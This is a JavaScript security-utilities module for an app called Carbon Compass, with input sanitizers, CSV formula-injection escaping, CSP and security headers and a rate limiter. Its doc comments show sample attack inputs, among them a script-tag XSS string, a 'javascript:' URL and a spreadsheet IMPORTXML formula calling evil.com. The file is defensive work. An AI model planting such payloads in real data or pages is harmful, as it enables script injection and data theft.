/**
 * @fileoverview Security utilities for Carbon Compass.
 *
 * Provides defense-in-depth input sanitization, output encoding,
 * and safe data handling functions. All functions are pure and testable.
 *
 * Security measures implemented:
 * - HTML tag stripping (XSS prevention)
 * - Control character removal
 * - URL parameter encoding
 * - CSV formula injection prevention
 * - Content Security Policy helpers
 * - Safe JSON serialization
 *
 * @module security
 * @license MIT
 */

// ─── HTML Sanitization ──────────────────────────────────────────────────────────

/**
 * Strip HTML tags and control characters from a string.
 * Prevents XSS attacks when rendering user input.
 *
 * @param {*} value - Raw input (coerced to string).
 * @returns {string} Sanitized, trimmed string.
 *
 * @example
 * sanitizeHtml('<script>alert("xss")</script>Hello')
 * // => 'alert("xss")Hello'
 *
 * sanitizeHtml('Normal text & symbols')
 * // => 'Normal text & symbols'
 */
export function sanitizeHtml(value = '') {
  return String(value)
    .replace(/<[^>]*>/g, '')                   // Strip HTML tags
    .replace(/[\u0000-\u001f\u007f]/g, ' ')    // Remove control characters
    .replace(/\s+/g, ' ')                       // Normalize whitespace
    .trim();
}

// ─── URL Encoding ───────────────────────────────────────────────────────────────

/**
 * Safely encode a value for use in a URL query parameter.
 * Sanitizes first, then encodes to prevent URL injection.
 *
 * @param {string} value - Raw value.
 * @returns {string} URL-safe encoded string.
 *
 * @example
 * encodeUrlParam('Hello World & More')
 * // => 'Hello%20World%20%26%20More'
 */
export function encodeUrlParam(value = '') {
  return encodeURIComponent(sanitizeHtml(value));
}

/**
 * Validate that a URL starts with an allowed scheme.
 * Prevents javascript: and data: URL injection.
 *
 * @param {string} url - URL to validate.
 * @param {string[]} [allowedSchemes=['https:']] - Allowed URL schemes.
 * @returns {boolean} True if URL has an allowed scheme.
 *
 * @example
 * isAllowedUrl('https://google.com')  // => true
 * isAllowedUrl('javascript:alert(1)') // => false
 */
export function isAllowedUrl(url, allowedSchemes = ['https:']) {
  try {
    const parsed = new URL(url);
    return allowedSchemes.includes(parsed.protocol);
  } catch {
    return false;
  }
}

// ─── CSV Security ───────────────────────────────────────────────────────────────

/**
 * Characters that trigger formula execution in spreadsheet applications.
 * @type {RegExp}
 */
const FORMULA_TRIGGER_PATTERN = /^[=+\-@\t\r]/;

/**
 * Sanitize a single CSV cell value.
 * Prevents CSV formula injection (DDE attacks) when users import
 * exported data into Google Sheets, Excel, or other spreadsheet apps.
 *
 * @param {*} value - Cell value.
 * @returns {string} Safe, quoted CSV cell string.
 *
 * @example
 * escapeCsvCell('=IMPORTXML("http://evil.com")')
 * // => "\"'=IMPORTXML(\"\"http://evil.com\"\")\""
 */
export function escapeCsvCell(value) {
  let text = sanitizeHtml(value ?? '');

  // Prefix formula-triggering characters with a single quote
  if (FORMULA_TRIGGER_PATTERN.test(text)) {
    text = `'${text}`;
  }

  // Double-quote escaping per RFC 4180
  return `"${text.replace(/"/g, '""')}"`;
}

/**
 * Build a safe CSV string from header and row data.
 *
 * @param {string[]} headers - Column header names.
 * @param {Array<Record<string, *>>} rows - Row objects keyed by header names.
 * @returns {string} RFC 4180 compliant CSV string with injection protection.
 *
 * @example
 * buildSafeCsv(['name', 'value'], [{ name: 'test', value: 42 }])
 * // => '"name","value"\n"test","42"'
 */
export function buildSafeCsv(headers, rows = []) {
  const lines = [headers.map(escapeCsvCell).join(',')];

  for (const row of rows) {
    const cells = headers.map((header) => escapeCsvCell(row[header]));
    lines.push(cells.join(','));
  }

  return lines.join('\n');
}

// ─── JSON Security ──────────────────────────────────────────────────────────────

/**
 * Safely serialize an object to JSON with depth protection.
 * Prevents circular reference errors and limits output size.
 *
 * @param {*} data - Data to serialize.
 * @param {number} [maxDepth=10] - Maximum nesting depth.
 * @returns {string} JSON string or error message.
 */
export function safeJsonStringify(data, maxDepth = 10) {
  const seen = new WeakSet();

  /**
   * Replacer function that prevents circular references.
   * @param {string} _key - Property key.
   * @param {*} value - Property value.
   * @returns {*}
   */
  function replacer(_key, value) {
    if (typeof value === 'object' && value !== null) {
      if (seen.has(value)) {
        return '[Circular]';
      }
      seen.add(value);
    }
    return value;
  }

  try {
    return JSON.stringify(data, replacer, 2);
  } catch {
    return '{"error": "Serialization failed"}';
  }
}

// ─── Content Security ───────────────────────────────────────────────────────────

/**
 * Generate a Content Security Policy header value.
 * Provides defense-in-depth even though the app is static.
 *
 * @returns {string} CSP header value.
 */
export function generateCspHeader() {
  const directives = [
    "default-src 'self'",
    "script-src 'self'",
    "style-src 'self' https://fonts.googleapis.com",
    "font-src 'self' https://fonts.gstatic.com",
    "img-src 'self' data:",
    "connect-src 'self'",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
  ];
  return directives.join('; ');
}

/**
 * Generate security-related HTTP headers.
 *
 * @returns {Record<string, string>} Security headers object.
 */
export function getSecurityHeaders() {
  return Object.freeze({
    'Content-Security-Policy': generateCspHeader(),
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
    'Permissions-Policy': 'geolocation=(), camera=(), microphone=()',
  });
}

// ─── Rate Limiting (Client-Side) ────────────────────────────────────────────────

/**
 * Simple client-side rate limiter using a token bucket algorithm.
 * Prevents abuse of export or calculation functions.
 *
 * @param {number} maxTokens - Maximum tokens in the bucket.
 * @param {number} refillMs - Milliseconds to refill one token.
 * @returns {{ tryConsume: () => boolean, remaining: () => number }}
 *
 * @example
 * const limiter = createRateLimiter(5, 1000);
 * limiter.tryConsume(); // true (4 remaining)
 * limiter.remaining();  // 4
 */
export function createRateLimiter(maxTokens = 10, refillMs = 1000) {
  let tokens = maxTokens;
  let lastRefill = Date.now();

  function refill() {
    const now = Date.now();
    const elapsed = now - lastRefill;
    const newTokens = Math.floor(elapsed / refillMs);
    if (newTokens > 0) {
      tokens = Math.min(maxTokens, tokens + newTokens);
      lastRefill = now;
    }
  }

  return {
    /**
     * Try to consume a token.
     * @returns {boolean} True if token was available and consumed.
     */
    tryConsume() {
      refill();
      if (tokens > 0) {
        tokens -= 1;
        return true;
      }
      return false;
    },

    /**
     * Get remaining tokens.
     * @returns {number}
     */
    remaining() {
      refill();
      return tokens;
    },
  };
}
